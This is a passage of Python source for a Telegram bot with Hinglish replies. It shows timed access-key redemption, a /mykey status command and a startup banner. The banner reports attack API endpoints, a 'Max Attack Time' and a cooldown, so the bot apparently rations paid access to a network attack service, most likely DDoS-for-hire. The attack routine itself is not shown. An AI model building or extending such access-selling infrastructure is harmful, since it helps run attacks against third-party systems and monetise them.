        if user and user.get('key_expiry') and datetime.fromisoformat(user['key_expiry']) > datetime.now():
            bot.reply_to(message, "⚠️ Aap trail key tabhi use kar sakte ho jab aapki koi active key nahi hai!")
            return
    
    user = data["users"].get(str(user_id))
    expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
    
    if user and user.get('key_expiry') and datetime.fromisoformat(user['key_expiry']) > datetime.now():
        new_expiry = datetime.fromisoformat(user['key_expiry']) + timedelta(seconds=key_doc['duration_seconds'])
        data["users"][str(user_id)]['key_expiry'] = new_expiry.isoformat()
        data["users"][str(user_id)]['key'] = key_input
        bot.reply_to(message, f"✅ Key Extended!\n\n⏰ Added: {key_doc['duration_label']}\n⏳ Total Time: {get_time_remaining(user_id)}", parse_mode="Markdown")
    else:
        data["users"][str(user_id)] = {
            'user_id': user_id,
            'username': user_name,
            'key': key_input,
            'key_expiry': expiry_time.isoformat(),
            'key_duration_label': key_doc['duration_label'],
            'redeemed_at': datetime.now().isoformat()
        }
        bot.reply_to(message, f"✅ Key Redeemed!\n\n🔑 Key: `{key_input}`\n⏰ Duration: {key_doc['duration_label']}\n⏳ Time Left: {get_time_remaining(user_id)}", parse_mode="Markdown")
    
    key_doc['used'] = True
    key_doc['used_by'] = user_id
    key_doc['used_at'] = datetime.now().isoformat()
    key_doc['current_users'] = key_doc.get('current_users', 0) + 1
    save_data(data)

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    user = data["users"].get(str(user_id))
    if not user or not user.get('key'):
        bot.reply_to(message, "❌ Tumhare paas koi key nahi hai!")
        return
    
    if not has_valid_key(user_id):
        bot.reply_to(message, "❌ Key khatam ho gayi!")
        return
    
    remaining = get_time_remaining(user_id)
    bot.reply_to(message, f"🔑 Key Details\n\n📌 Key: `{user['key']}`\n⏳ Remaining: {remaining}\n✅ Status: Active", parse_mode="Markdown")

# ============= MAIN =============
print("="*60)
print("🤖 BOT STARTING...")
print("="*60)
print(f"✅ Bot Token: {BOT_TOKEN[:15]}...")
print(f"✅ Owner ID: {BOT_OWNER}")
print(f"✅ API Endpoints: {len(API_LIST)}")
print(f"✅ Storage: JSON File (bot_data.json)")
print(f"✅ Max Attack Time: {get_max_attack_time()}s")
print(f"✅ Cooldown: {get_user_cooldown_setting()}s")
print("="*60)
print("🎯 Bot is ready! Waiting for commands...")
print("="*60)

while True:
    try:
        bot.polling(none_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f"Polling crashed: {e}, restarting in 3 seconds...")
        time.sleep(3)